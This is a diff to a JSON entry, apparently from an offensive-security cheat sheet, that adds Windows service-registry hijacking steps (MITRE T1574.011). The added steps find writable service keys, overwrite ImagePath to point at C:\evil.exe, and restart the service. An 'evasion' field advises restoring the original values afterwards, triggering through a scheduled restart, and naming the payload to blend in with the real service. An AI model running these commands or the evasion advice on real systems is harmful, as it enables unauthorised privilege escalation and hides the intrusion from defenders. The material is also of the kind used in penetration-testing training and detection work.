@@ -77,6 +77,27 @@
     "sources": [
       "HTB M26",
       "MITRE T1574.011"
-    ]
-  }
+    ],
+    "evasion": "Restore the original service binary/ACL/registry value after execution; trigger via a scheduled restart instead of an obvious sc stop/start; name the payload to blend with the legitimate service."
+  },
+  "variations": [
+    {
+      "label": "Check service reg key ACL",
+      "command": "Get-Acl HKLM:\\System\\CurrentControlSet\\Services\\<service> | fl"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Find services with a writable registry key",
+      "command": "Get-ModifiableRegistryAutoRun -Verbose"
+    },
+    {
+      "label": "Overwrite ImagePath",
+      "command": "reg add HKLM\\System\\CurrentControlSet\\Services\\<service> /v ImagePath /t REG_EXPAND_SZ /d \"C:\\evil.exe\" /f"
+    },
+    {
+      "label": "Restart the service",
+      "command": "sc stop <service> & sc start <service>"
+    }
+  ]
 }
